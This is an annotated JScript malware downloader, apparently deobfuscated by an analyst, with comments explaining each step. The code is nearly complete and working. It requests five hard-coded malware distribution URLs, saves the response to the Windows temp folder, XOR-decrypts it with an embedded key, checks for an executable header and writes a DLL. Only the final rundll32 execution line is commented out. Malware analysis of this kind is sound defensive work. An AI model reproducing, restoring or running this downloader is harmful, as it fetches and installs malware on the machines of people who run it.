/*
 * Annotated version of the original malware downloader
 */

//BEGIN_CODEC_PART

/**
 * Converts a string to an array of bytes using a lookup table.
 * @param {String} inputString - The String to be converted.
 * @returns {Array} byte-array representing the String.
 * @see Reverse of {@link byteArrayToString}
 */
function stringToByteArray(inputString) {
    var charmap = new Array();
    charmap[199] = 128;
    charmap[252] = 129;
    charmap[233] = 130;
    charmap[226] = 131;
    charmap[228] = 132;
    charmap[224] = 133;
    charmap[229] = 134;
    charmap[231] = 135;
    charmap[234] = 136;
    charmap[235] = 137;
    charmap[232] = 138;
    charmap[239] = 139;
    charmap[238] = 140;
    charmap[236] = 141;
    charmap[196] = 142;
    charmap[197] = 143;
    charmap[201] = 144;
    charmap[230] = 145;
    charmap[198] = 146;
    charmap[244] = 147;
    charmap[246] = 148;
    charmap[242] = 149;
    charmap[251] = 150;
    charmap[249] = 151;
    charmap[255] = 152;
    charmap[214] = 153;
    charmap[220] = 154;
    charmap[162] = 155;
    charmap[163] = 156;
    charmap[165] = 157;
    charmap[8359] = 158;
    charmap[402] = 159;
    charmap[225] = 160;
    charmap[237] = 161;
    charmap[243] = 162;
    charmap[250] = 163;
    charmap[241] = 164;
    charmap[209] = 165;
    charmap[170] = 166;
    charmap[186] = 167;
    charmap[191] = 168;
    charmap[8976] = 169;
    charmap[172] = 170;
    charmap[189] = 171;
    charmap[188] = 172;
    charmap[161] = 173;
    charmap[171] = 174;
    charmap[187] = 175;
    charmap[9617] = 176;
    charmap[9618] = 177;
    charmap[9619] = 178;
    charmap[9474] = 179;
    charmap[9508] = 180;
    charmap[9569] = 181;
    charmap[9570] = 182;
    charmap[9558] = 183;
    charmap[9557] = 184;
    charmap[9571] = 185;
    charmap[9553] = 186;
    charmap[9559] = 187;
    charmap[9565] = 188;
    charmap[9564] = 189;
    charmap[9563] = 190;
    charmap[9488] = 191;
    charmap[9492] = 192;
    charmap[9524] = 193;
    charmap[9516] = 194;
    charmap[9500] = 195;
    charmap[9472] = 196;
    charmap[9532] = 197;
    charmap[9566] = 198;
    charmap[9567] = 199;
    charmap[9562] = 200;
    charmap[9556] = 201;
    charmap[9577] = 202;
    charmap[9574] = 203;
    charmap[9568] = 204;
    charmap[9552] = 205;
    charmap[9580] = 206;
    charmap[9575] = 207;
    charmap[9576] = 208;
    charmap[9572] = 209;
    charmap[9573] = 210;
    charmap[9561] = 211;
    charmap[9560] = 212;
    charmap[9554] = 213;
    charmap[9555] = 214;
    charmap[9579] = 215;
    charmap[9578] = 216;
    charmap[9496] = 217;
    charmap[9484] = 218;
    charmap[9608] = 219;
    charmap[9604] = 220;
    charmap[9612] = 221;
    charmap[9616] = 222;
    charmap[9600] = 223;
    charmap[945] = 224;
    charmap[223] = 225;
    charmap[915] = 226;
    charmap[960] = 227;
    charmap[931] = 228;
    charmap[963] = 229;
    charmap[181] = 230;
    charmap[964] = 231;
    charmap[934] = 232;
    charmap[920] = 233;
    charmap[937] = 234;
    charmap[948] = 235;
    charmap[8734] = 236;
    charmap[966] = 237;
    charmap[949] = 238;
    charmap[8745] = 239;
    charmap[8801] = 240;
    charmap[177] = 241;
    charmap[8805] = 242;
    charmap[8804] = 243;
    charmap[8992] = 244;
    charmap[8993] = 245;
    charmap[247] = 246;
    charmap[8776] = 247;
    charmap[176] = 248;
    charmap[8729] = 249;
    charmap[183] = 250;
    charmap[8730] = 251;
    charmap[8319] = 252;
    charmap[178] = 253;
    charmap[9632] = 254;
    charmap[160] = 255;
    var converted = new Array();
    for (var i = 0; i < inputString.length; i++) {
        var charCode = inputString.charCodeAt(i);
        if (charCode < 128) {
            var character = charCode;
        } else {
            var character = charmap[charCode];
        }
        converted.push(character);
    };
    return converted;
}

/**
 * Translates an array of bytes (aka. "String") to another String using a lookup table.
 * @param {Array|String} inputString - The Array or String to be converted.
 * @returns {String} String mapped via lookup table
 * @see Reverse of {@link stringToByteArray}
 */
function byteArrayToString(inputString) {
    var charmap = new Array();
    charmap[128] = 199;
    charmap[129] = 252;
    charmap[130] = 233;
    charmap[131] = 226;
    charmap[132] = 228;
    charmap[133] = 224;
    charmap[134] = 229;
    charmap[135] = 231;
    charmap[136] = 234;
    charmap[137] = 235;
    charmap[138] = 232;
    charmap[139] = 239;
    charmap[140] = 238;
    charmap[141] = 236;
    charmap[142] = 196;
    charmap[143] = 197;
    charmap[144] = 201;
    charmap[145] = 230;
    charmap[146] = 198;
    charmap[147] = 244;
    charmap[148] = 246;
    charmap[149] = 242;
    charmap[150] = 251;
    charmap[151] = 249;
    charmap[152] = 255;
    charmap[153] = 214;
    charmap[154] = 220;
    charmap[155] = 162;
    charmap[156] = 163;
    charmap[157] = 165;
    charmap[158] = 8359;
    charmap[159] = 402;
    charmap[160] = 225;
    charmap[161] = 237;
    charmap[162] = 243;
    charmap[163] = 250;
    charmap[164] = 241;
    charmap[165] = 209;
    charmap[166] = 170;
    charmap[167] = 186;
    charmap[168] = 191;
    charmap[169] = 8976;
    charmap[170] = 172;
    charmap[171] = 189;
    charmap[172] = 188;
    charmap[173] = 161;
    charmap[174] = 171;
    charmap[175] = 187;
    charmap[176] = 9617;
    charmap[177] = 9618;
    charmap[178] = 9619;
    charmap[179] = 9474;
    charmap[180] = 9508;
    charmap[181] = 9569;
    charmap[182] = 9570;
    charmap[183] = 9558;
    charmap[184] = 9557;
    charmap[185] = 9571;
    charmap[186] = 9553;
    charmap[187] = 9559;
    charmap[188] = 9565;
    charmap[189] = 9564;
    charmap[190] = 9563;
    charmap[191] = 9488;
    charmap[192] = 9492;
    charmap[193] = 9524;
    charmap[194] = 9516;
    charmap[195] = 9500;
    charmap[196] = 9472;
    charmap[197] = 9532;
    charmap[198] = 9566;
    charmap[199] = 9567;
    charmap[200] = 9562;
    charmap[201] = 9556;
    charmap[202] = 9577;
    charmap[203] = 9574;
    charmap[204] = 9568;
    charmap[205] = 9552;
    charmap[206] = 9580;
    charmap[207] = 9575;
    charmap[208] = 9576;
    charmap[209] = 9572;
    charmap[210] = 9573;
    charmap[211] = 9561;
    charmap[212] = 9560;
    charmap[213] = 9554;
    charmap[214] = 9555;
    charmap[215] = 9579;
    charmap[216] = 9578;
    charmap[217] = 9496;
    charmap[218] = 9484;
    charmap[219] = 9608;
    charmap[220] = 9604;
    charmap[221] = 9612;
    charmap[222] = 9616;
    charmap[223] = 9600;
    charmap[224] = 945;
    charmap[225] = 223;
    charmap[226] = 915;
    charmap[227] = 960;
    charmap[228] = 931;
    charmap[229] = 963;
    charmap[230] = 181;
    charmap[231] = 964;
    charmap[232] = 934;
    charmap[233] = 920;
    charmap[234] = 937;
    charmap[235] = 948;
    charmap[236] = 8734;
    charmap[237] = 966;
    charmap[238] = 949;
    charmap[239] = 8745;
    charmap[240] = 8801;
    charmap[241] = 177;
    charmap[242] = 8805;
    charmap[243] = 8804;
    charmap[244] = 8992;
    charmap[245] = 8993;
    charmap[246] = 247;
    charmap[247] = 8776;
    charmap[248] = 176;
    charmap[249] = 8729;
    charmap[250] = 183;
    charmap[251] = 8730;
    charmap[252] = 8319;
    charmap[253] = 178;
    charmap[254] = 9632;
    charmap[255] = 160;
    var targetArray = new Array();
    var decodedString = "";
    var character;
    var charCode;
    for (var i = 0; i < inputString.length; i += 1) {
        character = inputString[i];
        if (character < 128) {
            charCode = character;
        } else {
            charCode = charmap[character];
        }
        targetArray.push(String.fromCharCode(charCode));
    }
    decodedString = targetArray.join("");
    return decodedString;
}

/**
 * Decrypts a String using a decryption Key
 * @param {String} inputString - The String to be decrypted.
 * @param {String} decryptionKey - The decryption key.
 * @returns {String} A decrypted String.
 */
function decryptString(inputString, decryptionKey) {
    var convertedCode = stringToByteArray(decryptionKey);
    for (var i = 0; i < inputString.length; i += 1) {
        inputString[i] ^= convertedCode[i % convertedCode.length];
    };
    return inputString;
}

/**
 * Reads a file as text and returns its byte-array representation using {@link stringToByteArray}
 * @param {String} fileName - The file name to read.
 * @returns {Array} The file content as byte array.
 */
function readFile(fileName) {
    var adodbStream = WScript.CreateObject("ADODB.Stream");
    adodbStream.type = 2; //adTypeText 
    adodbStream.Charset = "437";
    adodbStream.open();
    adodbStream.LoadFromFile(fileName);
    var fileContent = adodbStream.ReadText;
    adodbStream.close();
    return stringToByteArray(fileContent);
}

/**
 * Write a String to a file.
 * @param {String} fileName - The file name to write.
 * @param {String} fileContent - The content to be written to the file.
 */
function writeFile(fileName, fileContent) {
    var adodbStream = WScript.CreateObject("ADODB.Stream");
    adodbStream.type = 2; //adTypeText 
    adodbStream.Charset = "437";
    adodbStream.open();
    adodbStream.writeText(byteArrayToString(fileContent));
    adodbStream.SaveToFile(fileName, 2);
    adodbStream.close();
}
//END_CODEC_PART

// These are the URLs providing the malware
var urls = ["http://knutewhar.net/12wfsl0gk", 
			"http://glendaleoffice.com/iukivf8l", 
			"http://cheap-sports-jerseys.com/iqz2za5na", 
			"http://naschlouey.net/fl7h5lk", 
			"http://mainlandfishfarm.com/hzzqfh"];
			
// Temporary filename for download
var tempFileName = "tlNEa3xSzutcv";

// The key used to decrypt the downloaded file
var decryptionKey = "nauUUsJdpVFkBcCawZ3";

// The input parameter passed to the malware executable
var dllInputParameter = "jWo7sg8u";

// saveOption for creating or overwriting the temp file
var saveOption = 2; //adSaveCreateOverWrite

// Instance of a WScript Shell object
var wscriptShell = WScript.CreateObject("WScript.Shell");

// Expand the Windows temp directory to a fully qualified path
var windowsTempPath = wscriptShell.ExpandEnvironmentStrings("%TEMP%/");

// Fully qualified file name for the malware download
var tempFilePath = windowsTempPath + tempFileName;

// Fully qualified file name for the resulting malware executable
var tempFilePathDll = tempFilePath + ".dll";

// This part seems odd: Basically it checks the system architecture and defines where
// to find rundll32.exe to invoke the malware DLL. But it is not used (nor could it
// be used, based on the variable declaration)
var systemEnvironment = wscriptShell.Environment("System");
if (systemEnvironment("PROCESSOR_ARCHITECTURE").toLowerCase() == "amd64") {
    var pathToRunDLL32 = wscriptShell.ExpandEnvironmentStrings("%SystemRoot%\\SysWOW64\\rundll32.exe");
} else {
    var pathToRunDLL32 = wscriptShell.ExpandEnvironmentStrings("%SystemRoot%\\system32\\rundll32.exe");
}

// A list of possible HTTP-clients is iterated. The first hit wins.
var possibleHttpClients = ["MSXML2.XMLHTTP", "WinHttp.WinHttpRequest.5.1"];
for (var i = 0; i < possibleHttpClients.length; i += 1) {
    try {
        var httpClient = WScript.CreateObject(possibleHttpClients[i]);
        break;
    } catch (e) {
        continue;
    }
};

// Get an instance of FileSystemObject
var fileSystemObject = new ActiveXObject("Scripting.FileSystemObject");

/**
 * Returns the 8.3 compatible representation of the malware DLL.
 * @returns {String} The 8.3 path to malware DLL.
 */
function getDllShortPath() {
    var dllFile = fileSystemObject.GetFile(tempFilePathDll);
    return dllFile.ShortPath;
}

// Not used anywhere ...
var SBw9 = 0;

// Check all URLs ...
for (var i = 0; i < urls.length; i++) {
    try {
		// Prepare adodbStream to take the download content
        var adodbStream = this.WScript.CreateObject("ADODB.Stream");
        
		// Perform an HTTP-GET on the current URL
		httpClient.open("GET", urls[i], false);
        httpClient.setRequestHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
        httpClient.send();
		
		// Wait for readystate 4 ("DONE")
        while (httpClient.readystate < 4) WScript.Sleep(100);
        
		// Write response body of HTTP-GET to the temp file.
		adodbStream.open();
        adodbStream.type = 1; //adTypeBinary
        adodbStream.write(httpClient.ResponseBody);
        adodbStream.position = 0;
        adodbStream.SaveToFile(tempFilePath, saveOption);
        adodbStream.close();
		
		// Read the content from the temp file
		// (Why!? Didn't we just see it in the response body?)
        var downloadedFileContent = readFile(tempFilePath);
		
		// Decrypt the downloaded file
        downloadedFileContent = decryptString(downloadedFileContent, decryptionKey);
        
		// Check if the first two bytes equal "MZ" (https://en.wikipedia.org/wiki/DOS_MZ_executable)
		if (downloadedFileContent[0] != 77 || downloadedFileContent[1] != 90) {
			// Obviously not what we expected. Try next URL.
			continue;
		}
		
		// Write the decrypted contentst to the DLL
        writeFile(tempFilePathDll, downloadedFileContent);
        
		// Get the 8.3 path of the DLL
		var dllShortPath = getDllShortPath();
        
		// Do something completely unnecessary with a Date object ...
		var d = new Date();
        d.setFullYear("2015");
        
		// ... and run it with rundll32 and the DLL input parameter
		// This is deactivated for a reason!
		//wscriptShell.Run("rundll32 " + dllShortPath + "," + dllInputParameter);
        break;
    } catch (e) {
        continue;
    };
}
WScript.Quit(0);
